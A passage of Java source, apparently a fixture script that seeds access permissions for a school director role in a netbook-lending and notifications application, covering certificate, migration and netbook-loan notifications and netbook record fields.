		create("usuario_directivo","app:Dashboard:AllNotificaciones:*",executionContext);
		create("usuario_directivo","dom.notificaciones:Notificaciones:detallesYobservaciones:r",executionContext);
		create("usuario_directivo","dom.notificaciones:Notificaciones:establecimiento:r",executionContext);
		create("usuario_directivo","dom.notificaciones:Notificaciones:fechaNotificacion:r",executionContext);
		create("usuario_directivo","dom.notificaciones:Notificaciones:persona:r",executionContext);
		create("usuario_directivo","dom.notificaciones:Notificaciones:marcarComoNotificacionAtendida:*",executionContext);
		//PERMISOS DE USUARIO DIRECTIVO EN NOTIFICACIONES DE CERTIFICADO DE ALUMNO REGULAR 
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:detallesYobservaciones:r",executionContext);
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:establecimiento:r",executionContext);
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:fechaNotificacion:r",executionContext);
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:persona:r",executionContext);
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:marcarComoNotificacionAtendida:*",executionContext);
		create("usuario_directivo","dom.notificaciones:CertificadoAlumnoRegular:imprimirCertificadoAlumnoRegular:*",executionContext);
		//PERMISOS DE USUARIO DIRECTIVO EN NOTIFICACIONES DE SOLICITUD DE TRAMITE DE MIGRACION
		create("usuario_directivo","dom.notificaciones:SolicitudTramiteDeMigracion:imprimir:*",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:detallesYobservaciones:r",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:establecimiento:r",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:fechaNotificacion:r",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:persona:r",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:asignarNetbook:*",executionContext);
		create("usuario_directivo","dom.notificaciones:SolicitudNetbookPrestada:marcarComoNotificacionAtendida:*",executionContext);
		//PERMISOS DE USUARIO DIRECTIVO SOBRE NETBOOKS
		create("usuario_directivo","repo.netbook:RepositorioNetbook:listaNetbookPorId:*",executionContext);
		create("usuario_directivo","dom.netbook:ModeloNetbook:*:*",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:direccionMac:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:fechaDeExpiracion:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:idNebook:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:modelo:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:numeroDeActaDeRobo:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:numeroDeSerie:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:persona:r",executionContext);
		create("usuario_directivo","dom.netbook:Netbook:situacionDeNetbook:*",executionContext);
		
		}
		
		
	}

	
	private Permisos create(final String rol,String permiso,
			ExecutionContext executionContext) {
		
		return executionContext.add(this,
				repoLogin.aniadirPermiso(repoLogin.buscarRol(rol),permiso));
	}

	private boolean estaVacio(ExecutionContext executionContext) {
		return executionContext.add(this,
				repoLogin.verRoles().get(0).getListaPermiso().size()==0);
	}
	
	@javax.inject.Inject
	private repologin repoLogin;
}
